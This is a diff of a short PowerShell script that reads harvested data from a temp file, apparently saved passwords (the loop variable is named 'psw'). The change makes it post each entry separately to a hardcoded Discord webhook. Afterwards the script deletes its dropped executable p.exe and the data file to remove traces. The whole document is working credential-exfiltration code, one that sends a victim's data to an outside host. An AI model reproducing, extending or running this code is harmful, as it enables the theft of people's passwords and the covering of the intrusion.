@@ -4,8 +4,21 @@ Start-Sleep -Seconds 2;
 Start-Sleep -Seconds 1;
 
 $webhook = "https://discord.com/api/webhooks/1065364894037319831/D0K_i0IG0TUJ_tV0nCJaVScJYp_";
-$payload = @{ content = [IO.File]::ReadAllText("$env:TEMP\data.txt") };
-Invoke-RestMethod -URI ($webhook + "uCydJ2TZGpPr9xbPOLaC_WYWR-tPBJx2jQqhvZWUE") -Method Post -Body $payload;
+$content = [IO.File]::ReadAllText("$env:TEMP\data.txt");
+
+if (![string]::IsNullOrEmpty($content)) {
+    $lines = $content -split '\r?\n\r?\n';
+    if($lines.Length -ne 1) {
+        $lines = $lines | Where-Object { $_ -ne "" };
+    }
+    Write-Host $lines.Length;
+    foreach($psw in $lines) {
+        $payload = @{
+            content = "```````n$psw`n``````"
+        }
+        Invoke-RestMethod -URI ($webhook + "uCydJ2TZGpPr9xbPOLaC_WYWR-tPBJx2jQqhvZWUE") -Method Post -Body $payload;
+    }
+}
 
 Remove-Item -Path "$env:TEMP\p.exe";
 Remove-Item -Path "$env:TEMP\data.txt";
